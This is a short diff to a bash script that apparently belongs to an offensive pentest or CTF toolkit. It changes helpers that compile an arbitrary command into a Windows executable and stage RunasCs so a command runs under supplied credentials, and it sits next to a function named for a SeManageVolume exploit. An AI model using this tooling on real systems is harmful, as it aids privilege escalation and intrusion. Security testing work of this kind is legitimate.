@@ -136,6 +136,10 @@ create_run_windows_exe() {
     if [ -z "$run_windows_filename" ]; then
         run_windows_filename="run_windows"
     fi
+    local output_dir="."
+    if [[ ! -z "$temp_dir" ]]; then
+        output_dir="$temp_dir"
+    fi
     local string_length=${#command}
     echo "The length of the cmd string is: $string_length" >> $trail_log
     command=$(echo $command | sed -E 's/"/\\"/g')
@@ -143,7 +147,8 @@ create_run_windows_exe() {
     cp "$SCRIPTDIR/../c/run_windows.c" $run_windows_filename.c
     sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.c
     x86_64-w64-mingw32-gcc -o $run_windows_filename.exe $run_windows_filename.c
-    generate_windows_download "$run_windows_filename.exe"
+    generate_windows_download "$run_windows_filename.exe" "$output_dir\\$run_windows_filename.exe"
+    echo "$output_dir\\$run_windows_filename.exe"
 }
 
 create_run_windows_dll() {
@@ -352,7 +357,7 @@ download_runas() {
     fi
     generate_windows_download "runascs/Invoke-RunasCs.ps1" "Invoke-RunAsCs.ps1"
     echo '. ./Invoke-RunasCs.ps1;'
-    echo "Invoke-RunasCs $username $password $cmd;"
+    echo "Invoke-RunasCs $username $password \"$cmd\";"
 }
 
 perform_semanagevolume_exploit() {
